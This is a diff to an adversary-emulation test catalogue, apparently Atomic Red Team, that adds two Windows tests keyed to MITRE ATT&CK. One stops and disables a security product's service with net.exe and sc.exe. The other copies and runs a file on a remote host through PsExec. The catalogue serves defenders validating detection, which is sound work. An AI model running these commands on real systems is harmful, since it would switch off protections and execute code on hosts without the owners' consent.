@@ -6571,8 +6571,29 @@ defense-evasion:
           -Recurse
 
 '
-        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+        cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
           -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+
+'
+    - name: Disable Arbitrary Security Windows Service
+      description: "With administrative rights, an adversary can disable Windows Services
+        related to security products. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_name:
+          description: The name of the service to stop
+          type: String
+          default: McAfeeDLPAgentService
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          net.exe stop #{service_name}
+          sc.exe config #{service_name} start= disabled
+        cleanup_command: |-
+          sc.exe config #{service_name} start= auto
+          net.exe start #{service_name}
   T1107:
     technique:
       x_mitre_data_sources:
@@ -22605,6 +22626,28 @@ lateral-movement:
         name: powershell
         elevation_required: false
         command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
+
+'
+    - name: Copy and Execute File with PsExec
+      description: 'Copies a file to a remote host and executes it using PsExec. Requires
+        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote computer to receive the copy and execute the file
+          type: String
+          default: "\\\\localhost"
+        command_path:
+          description: File to copy and execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'psexec.exe #{remote_host} -c #{command_path}
 
 '
   T1028:
